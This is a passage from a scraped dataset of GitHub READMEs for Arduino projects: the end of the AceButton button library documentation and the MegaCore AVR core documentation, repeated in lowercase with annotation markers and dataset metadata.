encoded8to3buttonconfig classes would probably benefit from digitalwritefast libraries, but i have not created the \"fast\" versions of these (i.e. encoded4to2buttonconfigfast and encoded8to3buttonconfigfast) because i have not needed them personally.\nthe general encodedbuttonconfig class is more difficult to convert into a \"fast\" version, because its constructor takes a pointer argument to an array of physical pins. these are not compile-time constants so we would not be able to use the digitalwritefast libraries directly. i think the best we could do is create special encoded16to4buttonconfigfast and encoded32to5buttonconfigfast classes.\nresource consumption\nsizeof classes\nhere are the sizes of the various classes on the 8-bit avr microcontrollers (arduino uno, nano, etc):\nsizeof(acebutton): 14\nsizeof(buttonconfig): 18\nsizeof(buttonconfigfast1<>): 18\nsizeof(buttonconfigfast2<>): 18\nsizeof(buttonconfigfast3<>): 18\nsizeof(encoded4to2buttonconfig): 21\nsizeof(encoded8to3buttonconfig): 22\nsizeof(encodedbuttonconfig): 25\nsizeof(ladderbuttonconfig): 26\nfor 32-bit microcontrollers:\nsizeof(acebutton): 16\nsizeof(buttonconfig): 24\nsizeof(encoded4to2buttonconfig): 28\nsizeof(encoded8to3buttonconfig): 28\nsizeof(encodedbuttonconfig): 36\nsizeof(ladderbuttonconfig): 36\n(an early version of acebutton, with only half of the functionality, consumed 40 bytes. it got down to 11 bytes before additional functionality increased it to 14.)\nflash and static memory\nmemorybenchmark was used to determine the size of the library for various microcontrollers (arduino nano to esp32). here are 2 samples:\narduino nano\n+--------------------------------------------------------------+\n| functionality | flash/ ram | delta |\n|---------------------------------+--------------+-------------|\n| baseline | 610/ 11 | 0/ 0 |\n|---------------------------------+--------------+-------------|\n| buttonconfig | 1946/ 51 | 1336/ 40 |\n| buttonconfigfast1 | 1662/ 51 | 1052/ 40 |\n| buttonconfigfast2 | 1630/ 65 | 1020/ 54 |\n| buttonconfigfast3 | 1678/ 79 | 1068/ 68 |\n| encoded4to2buttonconfig | 2160/ 82 | 1550/ 71 |\n| encoded8to3buttonconfig | 2428/ 139 | 1818/ 128 |\n| encodedbuttonconfig | 2474/ 162 | 1864/ 151 |\n| ladderbuttonconfig | 2476/ 175 | 1866/ 164 |\n+--------------------------------------------------------------+\nesp8266:\n+--------------------------------------------------------------+\n| functionality | flash/ ram | delta |\n|---------------------------------+--------------+-------------|\n| baseline | 256924/26800 | 0/ 0 |\n|---------------------------------+--------------+-------------|\n| buttonconfig | 258424/26840 | 1500/ 40 |\n| buttonconfigfast1 | -1/ -1 | -1/ -1 |\n| buttonconfigfast2 | -1/ -1 | -1/ -1 |\n| buttonconfigfast3 | -1/ -1 | -1/ -1 |\n| encoded4to2buttonconfig | 258732/26916 | 1808/ 116 |\n| encoded8to3buttonconfig | 258876/26980 | 1952/ 180 |\n| encodedbuttonconfig | 259004/27020 | 2080/ 220 |\n| ladderbuttonconfig | 259048/27024 | 2124/ 224 |\n+--------------------------------------------------------------+\ncpu cycles\nthe profiling numbers for acebutton::check(), encodedbuttonconfig::checkbuttons(), and ladderbuttonconfig::checkbuttons() can be found in examples/autobenchmark. here are 2 samples, in units of microseconds.\narduino nano:\n+---------------------------+-------------+---------+\n| button event | min/avg/max | samples |\n|---------------------------+-------------+---------|\n| idle | 8/ 15/ 24 | 1931 |\n| press/release | 8/ 16/ 24 | 1924 |\n| click | 12/ 15/ 24 | 1924 |\n| double_click | 12/ 15/ 32 | 1921 |\n| long_press/repeat_press | 12/ 16/ 28 | 1924 |\n|---------------------------+-------------+---------|\n| buttonconfigfast1 | 8/ 14/ 24 | 1933 |\n| buttonconfigfast2 | 20/ 27/ 36 | 1910 |\n| buttonconfigfast3 | 28/ 40/ 48 | 1886 |\n|---------------------------+-------------+---------|\n| encoded4to2buttonconfig | 60/ 67/ 92 | 1839 |\n| encoded8to3buttonconfig | 164/186/208 | 1659 |\n| encodedbuttonconfig | 80/100/124 | 1785 |\n| ladderbuttonconfig | 176/199/272 | 1640 |\n+---------------------------+-------------+---------+\nesp8266:\n+---------------------------+-------------+---------+\n| button event | min/avg/max | samples |\n|---------------------------+-------------+---------|\n| idle | 6/ 8/ 52 | 1917 |\n| press/release | 6/ 8/ 62 | 1907 |\n| click | 6/ 8/ 38 | 1902 |\n| double_click | 6/ 8/ 32 | 1907 |\n| long_press/repeat_press | 6/ 8/ 41 | 1903 |\n|---------------------------+-------------+---------|\n| encoded4to2buttonconfig | 22/ 27/ 55 | 1878 |\n| encoded8to3buttonconfig | 54/ 66/ 90 | 1806 |\n| encodedbuttonconfig | 42/ 54/ 81 | 1831 |\n| ladderbuttonconfig | 136/149/491 | 1682 |\n+---------------------------+-------------+---------+\nsystem requirements\nhardware\nthis library has tier 1 support on the following boards:\narduino nano (16 mhz atmega328p)\nsparkfun pro micro (16 mhz atmega32u4)\nsamd21 m0 mini (48 mhz arm cortex-m0+)\nstm32 blue pill (stm32f103c8, 72 mhz arm cortex-m3)\nnodemcu 1.0 (esp-12e module, 80mhz esp8266)\nwemos d1 mini (esp-12e module, 80 mhz esp8266)\nesp32 dev module (esp-wroom-32 module, 240mhz dual core tensilica lx6)\nteensy 3.2 (96 mhz arm cortex-m4)\ntier 2 support can be expected on the following boards, mostly because i don't test these as often:\nattiny85 (8 mhz attiny85)\narduino pro mini (16 mhz atmega328p)\nteensy lc (48 mhz arm cortex-m0+)\nmini mega 2560 (arduino mega 2560 compatible, 16 mhz atmega2560)\nthe following boards are not officially supported, but acebutton may accidentally work on these:\nany platform using the arduinocore-api (https://github.com/arduino/arduinocore-api).\nfor example, nano every, mkrzero, and raspberry pi pico rp2040.\ntool chain\nthis library was developed and tested using:\narduino ide 1.8.13\narduino cli 0.14.0\nspencekonde attinycore 1.5.2\narduino avr boards 1.8.3\narduino samd boards 1.8.9\nsparkfun avr boards 1.1.13\nsparkfun samd boards 1.8.3\nstm32duino 2.0.0\nesp8266 arduino core 2.7.4\nesp32 arduino core 1.0.6\nteensyduino 1.53\nit should work with platformio but i have not tested it.\nthe library works on linux or macos (using both g++ and clang++ compilers) using the epoxyduino emulation layer.\noperating system\ni use ubuntu linux 18.04 and 20.04 for most of my development.\nbackground motivation\nthere are numerous \"button\" libraries out there for the arduino. why write another one? i wanted to add a button to an addressable strip led controller, which was being refreshed at 120 hz. i had a number of requirements:\nthe button needed to support a longpress event, in addition to the simple press and release events\nthe button code must not interfere with the led refresh code which was updating the leds at 120 hz\nwell-tested, i didn't want to be hunting down random and obscure bugs\nsince the led refresh code needed to run while the button code was waiting for a \"longpress\" delay, it seemed that the cleanest api for a button library would use an event handler callback mechanism. this reduced the number of candidate libraries to a handful. of these, only a few of them supported a longpress event. i did not find the remaining ones flexible enough for my button needs in the future. finally, i knew that it was tricky to write correct code for debouncing and detecting various events (e.g. doubleclick, longpress, repeatpress). i looked for a library that contained unit tests, and i found none.\ni decided to write my own and use the opportunity to learn how to create and publish an arduino library.\nnon-goals\nan arduino uno or nano has 16 times more flash memory (32kb) than static memory (2kb), so the library is optimized to minimize the static memory usage. the acebutton library is not optimized to create a small program size (i.e. flash memory), or for small cpu cycles (i.e. high execution speed). i assumed that if you are seriously optimizing for program size or cpu cycles, you will probably want to write everything yourself from scratch.\nthat said, examples/memorybenchmark shows that the library consumes between 970-2180 bytes of flash memory, and autobenchmark shows that acebutton::check() takes between ~15 microseconds on a 16mhz atmega328p chip and 2-3 microseconds on an esp32. hopefully that is small enough and fast enough for the vast majority of people.\nwith v1.9, i started using acebutton on an attiny85 which has only 8kb of flash and 0.5 kb of static ram. flash memory consumption became more important and i created the buttonconfigfast1, buttonconfigfast2, and buttonconfigfast3 classes to decrease the flash memory consumption by using one of the <digitalwritefast.h> 3rd party libraries. see digital write fast for more info.\nlicense\nversions 1.0 to 1.0.6: apache license 2.0\nversions 1.1 and above: mit license\ni changed to the mit license starting with version 1.1 because the mit license is so simple to understand. i could not be sure that i understood what the apache license 2.0 meant.\nfeedback and support\nif you have any questions, comments, or feature requests for this library, please use the github discussions for this project. if you have a bug report, please file a ticket in github issues. feature requests should go into discussions first because they often have alternative solutions which are useful to remain visible, instead of disappearing from the default view of the issue tracker after the ticket is closed.\nplease refrain from emailing me directly unless the content is sensitive. the problem with email is that i cannot reference the email conversation when other people ask similar questions later.\nauthor\ncreated by brian t. park (brian@xparks.net).", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000185, "year": null}, {"Unnamed: 0": 2229, "autor": 189, "date": null, "content": "MegaCore\nAn Arduino core for ATmega64, ATmega128, ATmega640, ATmega1280, ATmega1281, ATmega2560, ATmega2561, AT90CAN32, AT90CAN64 and AT90CAN128, all running Optiboot flash. This core requires at least Arduino IDE v1.6, where v1.8.5+ is recommended.\nIf you're into \"pure\" AVR programming, I'm happy to tell you that all relevant keywords are being highlighted by the IDE through a separate keywords file. Make sure to check out the example files (File > Examples > AVR C code examples).\nTable of contents\nSupported microcontrollers\nSupported clock frequencies\nBootloader option\nBOD option\nEEPROM retain option\nLink time optimization / LTO\nPrintf support\nPin macros\nPROGMEM with flash sizes greater than 64kB\nWrite to own flash\nProgrammers\nHow to install\nBoards Manager Installation\nManual Installation\nPlatformIO\nGetting started with MegaCore\nWiring reference\nPinout\nMinimal setup\nSupported microcontrollers:\nATmega2561\nATmega2560\nATmega1281\nATmega1280\nATmega640\nATmega128\nATmega64\nAT90CAN128\nAT90CAN64\nAT90CAN32\n(All variants - A, L, V)\nCan't decide what microcontroller to choose? Have a look at the specification table below:\nMega2560 Mega1280 Mega640 Mega2561 Mega1281 Mega128\nCAN128 Mega64\nCAN64 CAN32\nFlash 256kB 128kB 64kB 256kB 128kB 128kB 64kB 32kB\nRAM 8kB 8kB 8kB 8kB 8kB 4kB 4kB 2kB\nEEPROM 4kB 4kB 4kB 4kB 4kB 4kB 2kB 1kB\nIO pins 70/86 * 70/86 * 70/86 * 54 54 53 53 53\nPWM pins 15 15 15 8 8 7 7 7\nLED pin PB7 PB7 PB7 PB5 PB5 PB5 PB5 PB5\n* pin 70-85 is not broken out on the Arduino Mega. Make sure to check out the AVR style pinout for a cleaner an more logical pinout.\nSupported clock frequencies\nMegaCore supports a variety of different clock frequencies. Select the microcontroller in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses and upload the correct bootloader. Make sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu. For time critical operations an external crystal/oscillator is recommended.\nYou might experience upload issues when using the internal oscillator. It's factory calibrated but may be a little \"off\" depending on the calibration, ambient temperature and operating voltage. If uploading failes while using the 8 MHz internal oscillator you have these options:\nEdit the baudrate line in the boards.txt file, and choose either 115200, 57600, 38400 or 19200 baud.\nUpload the code using a programmer (USBasp, USBtinyISP etc.) or skip the bootloader by holding down the shift key while clicking the \"Upload\" button\nUse the 4, 2 or 1 MHz option instead\nFrequency Oscillator type Speed Comment\n16 MHz External crystal/oscillator 115200 Default clock on most AVR based Arduino boards\n20 MHz External crystal/oscillator 115200\n18.4320 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n14.7456 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n12 MHz External crystal/oscillator 57600 Useful when working with USB 1.1 (12 Mbit/s)\n11.0592 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n8 MHz External crystal/oscillator 57600 Common clock when working with 3.3V\n7.3728 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n4 MHz External crystal/oscillator 9600\n3.6864 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n2 MHz External crystal/oscillator 9600\n1.8432 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n1 MHz External crystal/oscillator 9600\n8 MHz Internal oscillator 38400 Might cause UART upload issues. See comment above\n4 MHz Internal oscillator 9600 Derived from the 8 MHz internal oscillator\n2 MHz Internal oscillator 9600 Derived from the 8 MHz internal oscillator\n1 MHz Internal oscillator 9600 Derived from the 8 MHz internal oscillator\nBootloader option\nMegaCore lets you select which serial port you want to use for uploading. UART0 is the default port for all targets, but any hardware serial port may be used. If your application doesn't need or require a bootloader for uploading code you can also choose to disable this by selecting No bootloader. This frees 1024 bytes of flash memory.\nNote that you have need to connect a programmer and hit Burn bootloader if you want to change any of the Upload port settings.\nBOD option\nBrown out detection, or BOD for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. To change the BOD settings you'll have to connect an ISP programmer and hit \"Burn bootloader\". Below is a table that shows the available BOD options:\nATmega640/1280/2560 ATmega1281/2561 ATmega64/128 AT90CAN32/64/128\n4.3V 4.3V 4.0V 4.1V\n2.7V 2.7V 2.7V 4.0V\n1.8V 1.8V 3.9V\n3.8V\n2.7V\n2.6V\n2.5V\nDisabled Disabled Disabled Disabled\nEEPROM option\nIf you want the EEPROM to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. You'll have to connect an ISP programmer and hit \"Burn bootloader\" to enable or disable EEPROM retain. Note that when uploading using a bootloader, the EEPROM will always be retained.\nLink time optimization / LTO\nAfter Arduino IDE 1.6.11 where released, there have been support for link time optimization or LTO for short. The LTO optimizes the code at link time, making the code (often) significantly smaller without making it \"slower\". In Arduino IDE 1.6.11 and newer LTO is enabled by default. I've chosen to disable this by default to make sure the core keep its backwards compatibility. Enabling LTO in IDE 1.6.10 and older will return an error. I encourage you to try the new LTO option and see how much smaller your code gets! Note that you don't need to hit \"Burn Bootloader\" in order to enable LTO. Simply enable it in the \"Tools\" menu, and your code is ready for compilation. If you want to read more about LTO and GCC flags in general, head over to the GNU GCC website!\nPrintf support\nUnlike the official Arduino cores, MegaCore has printf support out of the box. If you're not familiar with printf you should probably read this first. It's added to the Print class and will work with all libraries that inherit Print. Printf is a standard C function that lets you format text much easier than using Arduino's built-in print and println. Note that this implementation of printf will NOT print floats or doubles. This is a limitation of the avr-libc printf implementation on AVR microcontrollers, and nothing I can easily fix.\nIf you're using a serial port, simply use Serial.printf(\"Milliseconds since start: %ld\\n\", millis());. Other libraries that inherit the Print class (and thus supports printf) are the LiquidCrystal LCD library and the U8G2 graphical LCD library.\nPin macros\nNote that you don't have to use the digital pin numbers to refer to the pins. You can also use some predefined macros that maps \"Arduino pins\" to the port and port number:\n// Use PIN_PE0 macro to refer to pin PE0 (Arduino pin 0)\ndigitalWrite(PIN_PE0, HIGH);\n// Results in the exact same compiled code\ndigitalWrite(0, HIGH);\nPROGMEM with flash sizes greater than 64kB\nThe usual PROGMEM attribute stores constant data such as string arrays to flash and is great if you want to preserve the precious RAM. However, PROGMEM will only store content in the lower section, from 0 and up to 64kB. If you want to store data in other sections, you can use PROGMEM1 (64 - 128kB), PROGMEM2 (128 - 192kB), or PROGMEM3 (192 - 256kB), depending on the chip you're using. Accessing this data is not as straight forward as with PROGMEM, but it's still doable:\nconst char far_away[] PROGMEM1 = \"Hello from far away!\\n\"; // (64 - 128kB)\nconst char far_far_away[] PROGMEM2 = \"Hello from far, far away!\\n\"; // (128 - 192kB)\nconst char far_far_far_away[] PROGMEM3 = \"Hello from far, far, far away!\\n\"; // (192 - 256kB)\nvoid print_progmem()\n{\nuint8_t i;\nchar c;\n// Print out far_away\nfor(i = 0; i < sizeof(far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_away) + i);\nSerial.write(c);\n}\n// Print out far_far_away\nfor(i = 0; i < sizeof(far_far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_far_away) + i);\nSerial.write(c);\n}\n// Print out far_far_far_away\nfor(i = 0; i < sizeof(far_far_far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_far_far_away) + i);\nSerial.write(c);\n}\n}\nWrite to own flash\nMegaCore uses Optiboot Flash, a bootloader that supports flash writing within the running application, thanks to the work of @majekw. This means that content from e.g. a sensor can be stored in the flash memory directly without the need of external memory. Flash memory is much faster than EEPROM, and can handle at least 10 000 write cycles before wear becomes an issue. For more information on how it works and how you can use this in you own application, check out the Serial_read_write for a simple proof-of-concept demo, and Flash_put_get + Flash_iterate for useful examples on how you can store strings, structs and variables to flash and retrieve then afterwards. The Read_write_without_buffer example demonstrate how you can read and write to the flash memory on a lower level without using a RAM buffer.\nProgrammers\nSelect your microcontroller in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses and upload the correct bootloader.\nMake sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu. For time critical operations an external oscillator is recommended.\nHow to install\nBoards Manager Installation\nThis installation method requires Arduino IDE version 1.6.4 or greater.\nOpen the Arduino IDE.\nOpen the File > Preferences menu item.\nEnter the following URL in Additional Boards Manager URLs: https://mcudude.github.io/MegaCore/package_MCUdude_MegaCore_index.json\nOpen the Tools > Board > Boards Manager... menu item.\nWait for the platform indexes to finish downloading.\nScroll down until you see the MegaCore entry and click on it.\nClick Install.\nAfter installation is complete close the Boards Manager window.\nManual Installation\nClick on the \"Download ZIP\" button in the upper right corner. Extract the ZIP file, and move the extracted folder to the location \"~/Documents/Arduino/hardware\". Create the \"hardware\" folder if it doesn't exist. Open Arduino IDE, and a new category in the boards menu called \"MegaCore\" will show up.\nPlatformIO\nPlatformIO is an open source ecosystem for IoT development and supports MegaCore.\nSee PlatformIO.md for more information.\nGetting started with MegaCore\nOk, so you're downloaded and installed MegaCore, but how to get started? Here's a quick start guide:\nHook up your microcontroller as shown in the pinout diagram.\nIf you're not planning to use the bootloader (uploading code using a USB to serial adapter), the FTDI header and the 100 nF capacitor on the reset pin can be omitted.\nOpen the Tools > Board menu item, and select ATmega64, ATmega128, ATmega1281, ATmega2561, ATmega640, ATmega1280, ATmega2560, AT90CAN32, AT90CAN64 or AT90CAN128.\nSelect your preferred clock frequency. 16 MHz is standard on most Arduino boards.\nSelect what kind of programmer you're using under the Programmers menu.\nHit Burn Bootloader. If an LED is connected to pin PB5/PB7, it should flash twice every second.\nNow that the correct fuse settings is sat and the bootloader burnt, you can upload your code in two ways:\nDisconnect your programmer tool, and connect a USB to serial adapter to the microcontroller, like shown in the pinout diagram. Then select the correct serial port under the Tools menu, and click the Upload button. If you're getting some kind of timeout error, it means your RX and TX pins are swapped, or your auto reset circuity isn't working properly (the 100 nF capacitor on the reset line).\nKeep your programmer connected, and hold down the shift button while clicking Upload. This will erase the bootloader and upload your code using the programmer tool.\nYour code should now be running on the microcontroller!\nWiring reference\nTo extend this core's functionality a bit further, I've added a few missing Wiring functions to this hardware package. As many of you know Arduino is based on Wiring, but that doesn't mean the Wiring development isn't active. These functions is used as \"regular\" Arduino functions, and there's no need to include an external library.\nI hope you find this useful, because they really are!\nFunction list\nportMode()\nportRead()\nportWrite()\nsleepMode()\nsleep()\nnoSleep()\nenablePower()\ndisablePower()\nFor further information please view the Wiring reference page!\nPinout\nATmega64/128/1281/2561/CAN32/CAN64/CAN128\nSince there are no standardized Arduino pinout for this chip family, I've created one. I've tried to make it as simple and logical as possible. This pinout makes great sense if you're buying this cheap breakout boards at Ebay or AliExpress (just make sure to remove C3 in order to get auto reset working). The standard LED pin is assigned to Arduino pin 13, and will blink twice if you hit the reset button.\nATmega640/1280/2560\nBeside including the original Arduino Mega pinout for the ATmega640/1280/2560, I've also added an AVR style pinout, which is a more straight forward and logical pinout if you're not working with the Arduino Mega board. For the default Arduino Mega pinout, the standard LED pin is assigned to Arduino pin 13, and for the AVR pin it's assigned to pin 22. Click to enlarge:\nMinimal setup\nHere's some simple schematics for the ATmega64/128/1281/2561/CAN32/CAN64/CAN128 and ATmega640/1280/2560 showing a minimal setup using an external crystal. Omit the crystal and the two 22pF capacitors if you're using the internal oscillator.\nClick to enlarge:", "link": "https://github.com/MCUdude/MegaCore", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "megacore\nan arduino core for atmega64, atmega128, atmega640, atmega1280, atmega1281, atmega2560, atmega2561, at90can32, at90can64 and at90can128, all running optiboot flash. this core requires at least arduino ide v1.6, where v1.8.5+ is recommended.\nif you're into \"pure\" avr programming, i'm happy to tell you that all relevant keywords are being highlighted by the ide through a separate keywords file. make sure to check out the example files (file > examples > avr c code examples).\ntable of contents\nsupported microcontrollers\nsupported clock frequencies\nbootloader option\nbod option\neeprom retain option\nlink time optimization / lto\nprintf support\npin macros\nprogmem with flash sizes greater than 64kb\nwrite to own flash\nprogrammers\nhow to install\nboards manager installation\nmanual installation\nplatformio\ngetting started with megacore\nwiring reference\npinout\nminimal setup\nsupported microcontrollers:\natmega2561\natmega2560\natmega1281\natmega1280\natmega640\natmega128\natmega64\nat90can128\nat90can64\nat90can32\n(all variants - a, l, v)\ncan't decide what microcontroller to choose? have a look at the specification table below:\nmega2560 mega1280 mega640 mega2561 mega1281 mega128\ncan128 mega64\ncan64 can32\nflash 256kb 128kb 64kb 256kb 128kb 128kb 64kb 32kb\nram 8kb 8kb 8kb 8kb 8kb 4kb 4kb 2kb\neeprom 4kb 4kb 4kb 4kb 4kb 4kb 2kb 1kb\nio pins 70/86 * 70/86 * 70/86 * 54 54 53 53 53\npwm pins 15 15 15 8 8 7 7 7\nled pin pb7 pb7 pb7 pb5 pb5 pb5 pb5 pb5\n* pin 70-85 is not broken out on the arduino mega. make sure to check out the avr style pinout for a cleaner an more logical pinout.\nsupported clock frequencies\nmegacore supports a variety of different clock frequencies. select the microcontroller in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses and upload the correct bootloader. make sure you connect an isp programmer, and select the correct one in the \"programmers\" menu. for time critical operations an external crystal/oscillator is recommended.\nyou might experience upload issues when using the internal oscillator. it's factory calibrated but may be a little \"off\" depending on the calibration, ambient temperature and operating voltage. if uploading failes while using the 8 mhz internal oscillator you have these options:\nedit the baudrate line in the boards.txt file, and choose either 115200, 57600, 38400 or 19200 baud.\nupload the code using a programmer (usbasp, usbtinyisp etc.) or skip the bootloader by holding down the shift key while clicking the \"upload\" button\nuse the 4, 2 or 1 mhz option instead\nfrequency oscillator type speed comment\n16 mhz external crystal/oscillator 115200 default clock on most avr based arduino boards\n20 mhz external crystal/oscillator 115200\n18.4320 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n14.7456 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n12 mhz external crystal/oscillator 57600 useful when working with usb 1.1 (12 mbit/s)\n11.0592 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n8 mhz external crystal/oscillator 57600 common clock when working with 3.3v\n7.3728 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n4 mhz external crystal/oscillator 9600\n3.6864 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n2 mhz external crystal/oscillator 9600\n1.8432 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n1 mhz external crystal/oscillator 9600\n8 mhz internal oscillator 38400 might cause uart upload issues. see comment above\n4 mhz internal oscillator 9600 derived from the 8 mhz internal oscillator\n2 mhz internal oscillator 9600 derived from the 8 mhz internal oscillator\n1 mhz internal oscillator 9600 derived from the 8 mhz internal oscillator\nbootloader option\nmegacore lets you select which serial port you want to use for uploading. uart0 is the default port for all targets, but any hardware serial port may be used. if your application doesn't need or require a bootloader for uploading code you can also choose to disable this by selecting no bootloader. this frees 1024 bytes of flash memory.\nnote that you have need to connect a programmer and hit burn bootloader if you want to change any of the upload port settings.\nbod option\nbrown out detection, or bod for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. to change the bod settings you'll have to connect an isp programmer and hit \"burn bootloader\". below is a table that shows the available bod options:\natmega640/1280/2560 atmega1281/2561 atmega64/128 at90can32/64/128\n4.3v 4.3v 4.0v 4.1v\n2.7v 2.7v 2.7v 4.0v\n1.8v 1.8v 3.9v\n3.8v\n2.7v\n2.6v\n2.5v\ndisabled disabled disabled disabled\neeprom option\nif you want the eeprom to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. you'll have to connect an isp programmer and hit \"burn bootloader\" to enable or disable eeprom retain. note that when uploading using a bootloader, the eeprom will always be retained.\nlink time optimization / lto\nafter arduino ide 1.6.11 where released, there have been support for link time optimization or lto for short. the lto optimizes the code at link time, making the code (often) significantly smaller without making it \"slower\". in arduino ide 1.6.11 and newer lto is enabled by default. i've chosen to disable this by default to make sure the core keep its backwards compatibility. enabling lto in ide 1.6.10 and older will return an error. i encourage you to try the new lto option and see how much smaller your code gets! note that you don't need to hit \"burn bootloader\" in order to enable lto. simply enable it in the \"tools\" menu, and your code is ready for compilation. if you want to read more about lto and gcc flags in general, head over to the gnu gcc website!\nprintf support\nunlike the official arduino cores, megacore has printf support out of the box. if you're not familiar with printf you should probably read this first. it's added to the print class and will work with all libraries that inherit print. printf is a standard c function that lets you format text much easier than using arduino's built-in print and println. note that this implementation of printf will not print floats or doubles. this is a limitation of the avr-libc printf implementation on avr microcontrollers, and nothing i can easily fix.\nif you're using a serial port, simply use serial.printf(\"milliseconds since start: %ld\\n\", millis());. other libraries that inherit the print class (and thus supports printf) are the liquidcrystal lcd library and the u8g2 graphical lcd library.\npin macros\nnote that you don't have to use the digital pin numbers to refer to the pins. you can also use some predefined macros that maps \"arduino pins\" to the port and port number:\n// use pin_pe0 macro to refer to pin pe0 (arduino pin 0)\ndigitalwrite(pin_pe0, high);\n// results in the exact same compiled code\ndigitalwrite(0, high);\nprogmem with flash sizes greater than 64kb\nthe usual progmem attribute stores constant data such as string arrays to flash and is great if you want to preserve the precious ram. however, progmem will only store content in the lower section, from 0 and up to 64kb. if you want to store data in other sections, you can use progmem1 (64 - 128kb), progmem2 (128 - 192kb), or progmem3 (192 - 256kb), depending on the chip you're using. accessing this data is not as straight forward as with progmem, but it's still doable:\nconst char far_away[] progmem1 = \"hello from far away!\\n\"; // (64 - 128kb)\nconst char far_far_away[] progmem2 = \"hello from far, far away!\\n\"; // (128 - 192kb)\nconst char far_far_far_away[] progmem3 = \"hello from far, far, far away!\\n\"; // (192 - 256kb)\nvoid print_progmem()\n{\nuint8_t i;\nchar c;\n// print out far_away\nfor(i = 0; i < sizeof(far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_away) + i);\nserial.write(c);\n}\n// print out far_far_away\nfor(i = 0; i < sizeof(far_far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_far_away) + i);\nserial.write(c);\n}\n// print out far_far_far_away\nfor(i = 0; i < sizeof(far_far_far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_far_far_away) + i);\nserial.write(c);\n}\n}\nwrite to own flash\nmegacore uses optiboot flash, a bootloader that supports flash writing within the running application, thanks to the work of @majekw. this means that content from e.g. a sensor can be stored in the flash memory directly without the need of external memory. flash memory is much faster than eeprom, and can handle at least 10 000 write cycles before wear becomes an issue. for more information on how it works and how you can use this in you own application, check out the serial_read_write for a simple proof-of-concept demo, and flash_put_get + flash_iterate for useful examples on how you can store strings, structs and variables to flash and retrieve then afterwards. the read_write_without_buffer example demonstrate how you can read and write to the flash memory on a lower level without using a ram buffer.\nprogrammers\nselect your microcontroller in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses and upload the correct bootloader.\nmake sure you connect an isp programmer, and select the correct one in the \"programmers\" menu. for time critical operations an external oscillator is recommended.\nhow to install\nboards manager installation\nthis installation method requires arduino ide version 1.6.4 or greater.\nopen the arduino ide.\nopen the file > preferences menu item.\nenter the following url in additional boards manager urls: https://mcudude.github.io/megacore/package_mcudude_megacore_index.json\nopen the tools > board > boards manager... menu item.\nwait for the platform indexes to finish downloading.\nscroll down until you see the megacore entry and click on it.\nclick install.\nafter installation is complete close the boards manager window.\nmanual installation\nclick on the \"download zip\" button in the upper right corner. extract the zip file, and move the extracted folder to the location \"~/documents/arduino/hardware\". create the \"hardware\" folder if it doesn't exist. open arduino ide, and a new category in the boards menu called \"megacore\" will show up.\nplatformio\nplatformio is an open source ecosystem for iot development and supports megacore.\nsee platformio.md for more information.\ngetting started with megacore\nok, so you're downloaded and installed megacore, but how to get started? here's a quick start guide:\nhook up your microcontroller as shown in the pinout diagram.\nif you're not planning to use the bootloader (uploading code using a usb to serial adapter), the ftdi header and the 100 nf capacitor on the reset pin can be omitted.\nopen the tools > board menu item, and select atmega64, atmega128, atmega1281, atmega2561, atmega640, atmega1280, atmega2560, at90can32, at90can64 or at90can128.\nselect your preferred clock frequency. 16 mhz is standard on most arduino boards.\nselect what kind of programmer you're using under the programmers menu.\nhit burn bootloader. if an led is connected to pin pb5/pb7, it should flash twice every second.\nnow that the correct fuse settings is sat and the bootloader burnt, you can upload your code in two ways:\ndisconnect your programmer -----> tool !!! , and connect a usb to serial adapter to the microcontroller, like shown in the pinout diagram. then select the correct serial port under the tools menu, and click the upload button. if you're getting some kind of timeout error, it means your rx and tx pins are swapped, or your auto reset circuity isn't working properly (the 100 nf capacitor on the reset line).\nkeep your programmer connected, and hold down the shift button while clicking upload. this will erase the bootloader and upload your code using the programmer tool.\nyour code should now be running on the microcontroller!\nwiring reference\nto extend this core's functionality a bit further, i've added a few missing wiring functions to this hardware package. as many of you know arduino is based on wiring, but that doesn't mean the wiring development isn't active. these functions is used as \"regular\" arduino functions, and there's no need to include an external library.\ni hope you find this useful, because they really are!\nfunction list\nportmode()\nportread()\nportwrite()\nsleepmode()\nsleep()\nnosleep()\nenablepower()\ndisablepower()\nfor further information please view the wiring reference page!\npinout\natmega64/128/1281/2561/can32/can64/can128\nsince there are no standardized arduino pinout for this chip family, i've created one. i've tried to make it as simple and logical as possible. this pinout makes great sense if you're buying this cheap breakout boards at ebay or aliexpress (just make sure to remove c3 in order to get auto reset working). the standard led pin is assigned to arduino pin 13, and will blink twice if you hit the reset button.\natmega640/1280/2560\nbeside including the original arduino mega pinout for the atmega640/1280/2560, i've also added an avr style pinout, which is a more straight forward and logical pinout if you're not working with the arduino mega board. for the default arduino mega pinout, the standard led pin is assigned to arduino pin 13, and for the avr pin it's assigned to pin 22. click to enlarge:\nminimal setup\nhere's some 